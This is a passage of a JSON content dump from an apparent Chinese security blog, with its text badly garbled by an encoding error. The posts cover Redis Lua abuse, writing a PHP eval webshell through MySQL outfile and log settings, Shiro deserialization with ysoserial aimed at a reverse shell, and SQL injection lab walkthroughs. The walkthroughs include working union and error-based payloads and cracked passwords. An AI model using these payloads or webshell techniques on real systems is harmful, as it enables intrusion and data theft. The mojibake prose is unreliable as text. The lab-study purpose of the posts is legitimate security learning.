åˆ©ç”¨æ–¹å¼å››ï¼šæ‰§è¡Œluaè„šæœ¬Redisåœ¨2.6æ¨å‡ºäº†è„šæœ¬åŠŸèƒ½ï¼Œå…è®¸å¼€å‘è€…ä½¿ç”¨luaè¯­è¨€ç¼–å†™è„šæœ¬ä¼ åˆ°Redisä¸­æ‰§è¡Œã€‚æš‚æ—¶è¿˜æ²¡æ‰¾åˆ°æ€ä¹ˆåˆ©ç”¨luaæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ç¼–å†™luaè„šæœ¬test.luaè¾“å‡ºå­—ç¬¦hello,world! 12local a = &quot;hello,world!&quot;return a redis-cli â€“eval test.lua -h é¶æœº2","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"webæ¼æ´/æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"redisæœªæˆæƒè®¿é—®","slug":"redisæœªæˆæƒè®¿é—®","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"Mysqlå†™shellçš„å‡ ç§æ–¹å¼","slug":"Mysqlå†™shellçš„å‡ ç§æ–¹å¼","date":"2021-07-06T03:04:00.000Z","updated":"2021-12-08T08:19:13.390Z","comments":true,"path":"2021/07/06/Mysqlå†™shellçš„å‡ ç§æ–¹å¼/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"Mysqlå†™shellçš„å‡ ç§æ–¹å¼å½“æˆ‘ä»¬æ‹¿åˆ°æ•°æ®åº“æƒé™æ—¶ï¼Œå¯é€šè¿‡æ•°æ®åº“ç®¡ç†å·¥å…·å†™å…¥shellåˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œåˆ©ç”¨shellæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚ å¤ç°ç¯å¢ƒï¼šphpstudy_pro 8.1.0.6mysql 5.7.26 rootæƒé™ ç½‘ç«™ç»å¯¹è·¯å¾„ä¸ºD:\\phpstudy_pro\\WWW åˆ©ç”¨æ–¹å¼ï¼š é€šè¿‡outfileå†™å…¥shellå°è¯•é€šè¿‡outfileå†™å…¥æ–‡ä»¶ 1æŠ¥é”™[Code: 1290, SQL State: HY000]The MySQL server is running with the â€“secure-file-priv option so it cannot execute this statement ç™¾åº¦ä¹‹åæ‰¾åˆ°åŸå› ï¼šmysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULLï¼Œé™åˆ¶æ— æ³•å¯¼å…¥å’Œå¯¼å‡ºæ–‡ä»¶ è§£å†³åŠæ³•ï¼šåœ¨my.inié…ç½®æ–‡ä»¶[mysqld]ä¸‹æ·»åŠ secure_file_priv =&quot;&quot;ä½¿å…¶é»˜è®¤ä¸ºç©º æ–°å»ºæŸ¥è¯¢select 12&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;;ï¼ŒæˆåŠŸå†™å…¥shell.phpæ–‡ä»¶ èšå‰‘è¿æ¥http://localhost:122/shell.phpæˆåŠŸ å‘è¡¨æ’å…¥shellå¹¶æŸ¥è¯¢å¯¼å‡ºå°†ä¸€å¥è¯æœ¨é©¬ä½œä¸ºæ•°æ®æ’å…¥test1è¡¨usernameå­—æ®µä¸­ 1insert into`test1`(`username`) values (&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;); æŸ¥è¯¢è¯¥æ•°æ®å¹¶å¯¼å‡ºåˆ°shell.php 1select username from test1 into outfile &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; èšå‰‘è¿æ¥http://localhost:122/shell.phpæˆåŠŸ å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shellé¦–å…ˆæŸ¥çœ‹å…¨å±€æ—¥å¿—æ˜¯å¦å¼€å¯ 1show variables like &#x27;%general%&#x27;; å¦‚å›¾æ‰€ç¤ºgeneral_log=OFFå…¨å±€æ—¥å¿—æœªå¼€å¯ 1234å¼€å¯å…¨å±€æ—¥å¿— set global general_log = on; å°†å…¨å±€æ—¥å¿—è·¯å¾„è®¾ç½®ä¸ºshellæ–‡ä»¶è·¯å¾„ set global general_log_file = &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 1æ–°å»ºæŸ¥è¯¢select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;; mysqlä¼šå°†æ‰§è¡Œçš„è¯­å¥è®°å½•åˆ°å…¨å±€æ—¥å¿—ï¼Œä»è€Œå°†shellå†™å…¥ç½‘ç«™ç›®å½• èšå‰‘è¿æ¥æˆåŠŸ æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shellç”±äºåœ¨mysql&gt;5.6.34ä¸­ï¼Œsecure_file_privä¼šé˜»æ‹¦æˆ‘ä»¬ä½¿ç”¨outfileå†™å…¥æ–‡ä»¶ï¼Œæ²¡æœ‰æœåŠ¡å™¨æƒé™æ— æ³•ä¿®æ”¹my.inié…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shellï¼ŒåŸç†å’Œåˆ©ç”¨å…¨å±€æ—¥å¿—å·®ä¸å¤šã€‚é¦–å…ˆä¸€æ ·æŸ¥çœ‹æ…¢æŸ¥è¯¢æ—¥å¿—æ˜¯å¦å¼€å¯ 1show variables like &#x27;%slow_query_log%&#x27;; å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å¹¶ä¿®æ”¹æ—¥å¿—æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ ä½¿ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—æ—¶ï¼Œåªæœ‰å½“æŸ¥è¯¢æ—¶é—´è¶…è¿‡ç³»ç»Ÿæ—¶é—´æ—¶æ‰ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ 1æŸ¥è¯¢mysqlç³»ç»Ÿæ—¶é—´ show global variables like &#x27;%long_query_time%&#x27;; å‘æ—¥å¿—ä¸­å†™å…¥shell 1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);è®¾ç½®æŸ¥è¯¢æ—¶é—´ä¸º11s æ‰§è¡ŒæˆåŠŸ èšå‰‘è¿æ¥æˆåŠŸ phpMyAdminæ–‡ä»¶åŒ…å«æ¼æ´CVE-2018-19968CVE-2018-12613CVE-2016-5734CVE-2014-8959","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥/getshell","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"}],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"getshell","permalink":"https://redredredfish.github.io/tags/getshell/"}],"author":"redfish"},{"title":"shiroååºåˆ—åŒ–çš„åˆçº§ç†è§£","slug":"shiroååºåˆ—åŒ–","date":"2021-07-06T02:37:00.000Z","updated":"2021-12-06T03:09:26.034Z","comments":true,"path":"2021/07/06/shiroååºåˆ—åŒ–/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"shiroååºåˆ—åŒ–åŸç†rememberMeåŠŸèƒ½ï¼šshiroæ¡†æ¶æä¾›äº†rememberMeåŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¤§æ¦‚æ˜¯ç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆä¸€ä¸ªå‡­è¯ç»„ï¼Œshiroå°†å®ƒç»è¿‡åºåˆ—åŒ–-&gt;AESåŠ å¯†-&gt;Base64åŠ å¯†å¾—åˆ°ä¸€ä¸²æ•°æ®æµä¼ å›ç»™cookieï¼Œä¸‹æ¬¡ç™»å½•æ—¶ï¼Œshiroé€šè¿‡Base64è§£ç -&gt;AESè§£å¯†-&gt;ååºåˆ—åŒ–éªŒè¯cookieä¸­çš„rememberMeåŒ…å«çš„å‡­è¯ç»„æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œå®ç°â€œä¸‹æ¬¡ç™»å½•è®°ä½æˆ‘â€çš„åŠŸèƒ½ã€‚ æ¼æ´åŸç†ï¼šé€ æˆshiroååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹ï¼Œä¸€ä¸ªæ˜¯Shiro&lt;1.2.4ä¸­ï¼ŒAES-CBCåŠ è§£å¯†æ—¶keyé»˜è®¤ä¸ºç¡¬ç¼–ç ï¼Œåªè¦èƒ½è·å–åˆ°è¿™ä¸ªkeyå°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®è®©shiroè¯†åˆ«ä¸ºæ­£å¸¸æ•°æ®ï¼›å¦ä¸€ä¸ªç‚¹æ˜¯shiroåœ¨éªŒè¯rememberMeæ—¶ä½¿ç”¨äº†readObjectæ–¹æ³•ï¼ŒreadObjectç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–åéœ€è¦æ‰§è¡Œçš„ä»£ç ç‰‡æ®µï¼Œä»è€Œé€ æˆæ¶æ„å‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œã€‚ æ¼æ´åˆ©ç”¨ï¼š é¦–å…ˆéœ€è¦è·å–æ­£ç¡®çš„keyå€¼ï¼Œåˆ©ç”¨shiroæ¥æ”¶é”™è¯¯rememberMeä¼šæŠ›å‡ºå¼‚å¸¸è¿”å›Set-Cookieçš„ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´ï¼Œç›´åˆ°å“åº”å¤´ä¸­ä¸åŒ…å«Set-Cookieï¼Œè¯´æ˜keyæˆåŠŸåŒ¹é…ã€‚ æ¥ç€éœ€è¦å¯¹æ¶æ„æ•°æ®è¿›è¡Œåºåˆ—åŒ–ï¼Œshiroåºåˆ—åŒ–å¯¹è±¡åªæœ‰ç»§æ‰¿PrincipalCollectionæ—¶ï¼Œç±»å‹è½¬æ¢æ‰æ­£å¸¸ï¼Œä¸ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¿™é‡Œå¯ä»¥å€ŸåŠ©ysoserialç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼šåˆ©ç”¨ysoserialä¸­çš„JRMPç›‘å¬æ¨¡å—è¿›è¡Œåå¼¹shellï¼Œéœ€ä½¿ç”¨Java Runtime é…åˆ bash ç¼–ç  java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener ç›‘å¬ç«¯å£CommonsCollections4 â€˜bashç¼–ç â€™ åˆ©ç”¨ysoserialç”Ÿæˆ.seræ–‡ä»¶ java -jarysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 â€œå‘½ä»¤â€ &gt; x.ser ç„¶åè¿›è¡ŒAESåŠ å¯†ã€Base64åŠ å¯†ï¼Œä¼ªé€ cookieï¼Œæ‰§è¡Œå‘½ä»¤ å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶åœ¨è¯·æ±‚åŒ…ä¸­çš„cookieå­—æ®µæ·»åŠ rememberMe=xxx,æŸ¥çœ‹å“åº”å¤´ä¸­æ˜¯å¦åŒ…å«rememberMe=deleteMeå€¼ä¾‹å¦‚ï¼š","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"shiroååºåˆ—åŒ–","slug":"shiroååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"å¢¨è€…-SQLæ³¨å…¥æ¼æ´æµ‹è¯•(æŠ¥é”™ç›²æ³¨) é¢˜è§£","slug":"å¢¨è€…-SQLæ³¨å…¥æ¼æ´æµ‹è¯•-æŠ¥é”™ç›²æ³¨-é¢˜è§£","date":"2021-06-21T08:20:00.000Z","updated":"2021-12-08T08:26:44.798Z","comments":true,"path":"2021/06/21/å¢¨è€…-SQLæ³¨å…¥æ¼æ´æµ‹è¯•-æŠ¥é”™ç›²æ³¨-é¢˜è§£/","link":"","permalink":"https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/","excerpt":"","text":"é¶åœºåœ°å€ï¼šhttps://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe ä¾æ—§æ˜¯mysqlã€æ— é˜²æŠ¤ â‘ ä¾æ—§æ˜¯å…¬å‘Šç•Œé¢ url:http://219.153.49.228:44679/new_list.php?id=1 1&#39;,1&#39; and &#39;1&#39;=&#39;1&#39; -- q,1&#39; and &#39;1&#39;=&#39;2&#39; -- qåˆ¤æ–­å­˜åœ¨å­—ç¬¦å‹æ³¨å…¥ æ•°æ®åº“ç±»å‹ä¸ºMariaDB â‘¡order by åˆ¤æ–­å­—æ®µæ•°ä¸º4ï¼Œunion selectæ— å›æ˜¾ â‘¢å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œåˆ©ç”¨å‡½æ•°updatexml() updatexmlå‚æ•°(ç›®æ ‡xmlå†…å®¹,xmlæ–‡æ¡£è·¯å¾„,æ›´æ–°çš„å†…å®¹) å½“æ–‡æ¡£è·¯å¾„åŒ…å«å­—ç¬¦~,ä¼šåˆ¤æ–­ä¸åˆæ³•ï¼Œè¾“å‡ºå­—ç¬¦~æŠ¥é”™ åˆ©ç”¨concatå‡½æ•°å°†å­æŸ¥è¯¢è¯­å¥ä¸å­—ç¬¦~æ‹¼æ¥ ä¾‹å¦‚ï¼šconcat(0x7e,(select user())) ä¼šå°†æŸ¥è¯¢ç»“æœæ‹¼æ¥~æŠ¥é”™è¾“å‡º æ‰€ä»¥å°è¯• id=1&#39; and updatexml(1,concat(0x7e,(select user())),1) -- qåˆ¤æ–­å­˜åœ¨æŠ¥é”™æ³¨å…¥ â‘£æ¥ä¸‹æ¥è¿˜æ˜¯è”åˆæ³¨å…¥é‚£ä¸€å¥—ï¼Œæ›¿æ¢å­æŸ¥è¯¢è¯­å¥å³å¯ id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),1) -- q çˆ†å‡ºåº“åinformation_schema,mysql,perfor æŸ¥è¯¢perforåº“æ˜¯ç©ºçš„ database()æŸ¥è¯¢å‡ºå½“å‰æ•°æ®åº“ä¸ºstormgroupï¼Œå±…ç„¶ä¸åœ¨schema_nameé‡Œ çˆ†å‡ºè¡¨åmember,notice è¡¨memberçˆ†å‡ºå­—æ®µname,password,status â‘¤åˆ†åˆ«æŸ¥è¯¢å­—æ®µå€¼ id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(å­—æ®µ) from member)),1) -- q nameå­—æ®µï¼šmozhe,mozhe statuså­—æ®µï¼š0,1 æŸ¥è¯¢passwordå­—æ®µæ—¶ï¼Œæ ¹æ®å¦å¤–ä¸¤ä¸ªå­—æ®µå¯çŸ¥æœ‰ä¸¤æ¡æ•°æ®ï¼Œå› ä¸ºæŠ¥é”™é•¿åº¦æœ€å¤šä¸º32ä½ï¼Œå­—ç¬¦~å äº†1ä½ï¼Œå‰©ä¸‹31ä½ä¸å¤Ÿè¾“å‡ºç¬¬ä¸€ä¸ª32ä½çš„MD5å¯†ç ï¼Œè€Œä¸”ç¬¬ä¸€æ¡æ•°æ®statuså­—æ®µå€¼ä¸º0ï¼Œå¤§æ¦‚ç‡ç”¨ä¸äº†ã€‚ ç›´æ¥æŸ¥è¯¢ç¬¬äºŒæ¡æ•°æ® id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from member where status=&#39;1&#39;)),1) -- qå¾—åˆ°~76e59b744c5db295a5f0b66f2e9a192 ä¾æ—§å°‘äº†ä¸€ä½ï¼Œåˆ©ç”¨å‡½æ•°substr(å­—ç¬¦ä¸²ï¼Œ32ï¼Œ1)è¾“å‡ºç¬¬32ä½å­—ç¬¦ id=11111111&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),32,1) from member where status=1)),1) -- q å¾—åˆ°~e æ‹¼ä¸€æ‹¼å¾—åˆ°76e59b744c5db295a5f0b66f2e9a192e è§£å¯†å¾—åˆ°945748 mozhe/945748ç™»å½•å¾—åˆ°key","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"é¶åœº","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥/é¶åœº","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysqlæ³¨å…¥","slug":"mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"æŠ¥é”™æ³¨å…¥","slug":"æŠ¥é”™æ³¨å…¥","permalink":"https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"}],"author":"redfish"},{"title":"å¢¨è€…-SQLæ‰‹å·¥æ³¨å…¥æ¼æ´æµ‹è¯•ï¼ˆMySQLæ•°æ®åº“-å­—ç¬¦å‹ï¼‰é¢˜è§£","slug":"å¢¨è€…-SQLæ‰‹å·¥æ³¨å…¥æ¼æ´æµ‹è¯•ï¼ˆMySQLæ•°æ®åº“-å­—ç¬¦å‹ï¼‰é¢˜è§£","date":"2021-06-20T08:14:00.000Z","updated":"2021-12-08T08:26:34.683Z","comments":true,"path":"2021/06/20/å¢¨è€…-SQLæ‰‹å·¥æ³¨å…¥æ¼æ´æµ‹è¯•ï¼ˆMySQLæ•°æ®åº“-å­—ç¬¦å‹ï¼‰é¢˜è§£/","link":"","permalink":"https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/","excerpt":"","text":"é¶åœºåœ°å€ï¼šhttps://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe é¢˜è§£ï¼šâ‘ å¯åŠ¨é¶åœº urlï¼šhttp://219.153.49.228:43157/ æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ˜¾ç„¶éœ€è¦ç™»å½•è·å¾—keyï¼Œä¸€å¼€å§‹ä½¿ç”¨ä¸‡èƒ½å¯†ç ã€æŠ“åŒ…éƒ½æ²¡æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œç»“æœåœ¨è¿™ä¸ªæ»šåŠ¨çš„å…¬å‘Šé¡µé¢ url:http://219.153.49.228:43157/new_list.php?id=tingjigonggao â‘¡è¿›å…¥é¡µé¢ï¼Œurlä¸­æœ‰id=tingjigonggaoï¼Œæ˜¾ç¤ºæ˜¯getçš„å­—ç¬¦å‹å‚æ•° è¯•ä¸€ä¸‹id=tingjigonggao&#39;ï¼ŒæŠ¥é”™ è¯•ä¸€ä¸‹id=tingjigonggao&#39; and &#39;1&#39;=&#39;1&#39; -- q,é¡µé¢æ­£å¸¸ è¯•ä¸€ä¸‹id=tingjigonggao&#39; and &#39;1&#39;=&#39;2&#39; -- q,é¡µé¢ä¸æ­£å¸¸ åˆ¤æ–­å­˜åœ¨å­—ç¬¦å‹æ³¨å…¥ã€‚ â‘¢åˆ¤æ–­å­—æ®µæ•° id=aaa&#39; order by 5 -- qï¼ŒæŠ¥é”™ id=aaa&#39; order by 4 -- qï¼Œæ²¡æ•°æ®ï¼Œæ­£å¸¸ åˆ¤æ–­å­—æ®µæ•°ä¸º4ã€‚ â‘£åˆ¤æ–­å›æ˜¾ç‚¹ id=aaa&#39; union select 1,2,3,4 -- q2,3å‚æ•°å¤„å›æ˜¾ã€‚ â‘¤å‚æ•°æ›¿æ¢version()æŸ¥çœ‹ç‰ˆæœ¬ id=aaa&#39; union select 1,2,version(),4 -- qMariaDB-10.2.15&gt;mysql5.0,æ”¾å¿ƒç”¨information_schemaåº“ã€‚ â‘¥æŸ¥è¯¢æ‰€æœ‰åº“å id=aaa&#39; union select 1,2,group_concat(schema_name),4 from information_schema.schemata -- qè·å¾—åº“åinformation_schema,mozhe_discuz_stormgroup,mysql,performance_schema,test â‘¦æŸ¥è¯¢mozhe_discuz_stormgroupåº“ä¸­çš„è¡¨id=aaa&#39; union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=&#39;mozhe_discuz_stormgroup&#39; -- qè·å¾—è¡¨ånotice,stormgroup_memberâ‘§æŸ¥è¯¢stormgroup_memberè¡¨ä¸­å­—æ®µåid=aaa&#39; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=&#39;stormgroup_member&#39; -- qè·å¾—å­—æ®µåid,name,password,status â‘¨æŸ¥è¯¢å­—æ®µå€¼id=aaa&#39; union select 1,2,group_concat(name,0x7c,password),4 from stormgroup_member -- qè·å–ç”¨æˆ·åå’ŒMD5åŠ å¯†çš„passwordmozhe|356f589a7df439f6f744ff19bb8092c0,mozhe|57673e9e6b26829ba7a4b4d43e8ae8a7somd5è§£å¯†å¾—åˆ°ä¸¤ä¸ªå¯†ç dsan13ï¼Œ891185ï¼Œåé¢ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œç¦»è°±ã€‚ã€‚ã€‚ç™»å½•è·å–keyã€‚","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"é¶åœº","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥/é¶åœº","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"mysqlæ³¨å…¥","slug":"mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"è”åˆæ³¨å…¥","slug":"è”åˆæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"é¶åœº","slug":"é¶åœº","permalink":"https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"redfish"}],"categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ssrf","slug":"webæ¼æ´/ssrf","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"webæ¼æ´/æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥/getshell","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"},{"name":"é¶åœº","slug":"webæ¼æ´/sqlæ³¨å…¥/mysqlæ³¨å…¥/é¶åœº","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://redredredfish.github.io/tags/ssrf/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogicååºåˆ—åŒ–","slug":"weblogicååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"redisæœªæˆæƒè®¿é—®","slug":"redisæœªæˆæƒè®¿é—®","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"getshell","permalink":"https://redredredfish.github.io/tags/getshell/"},{"name":"shiroååºåˆ—åŒ–","slug":"shiroååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"mys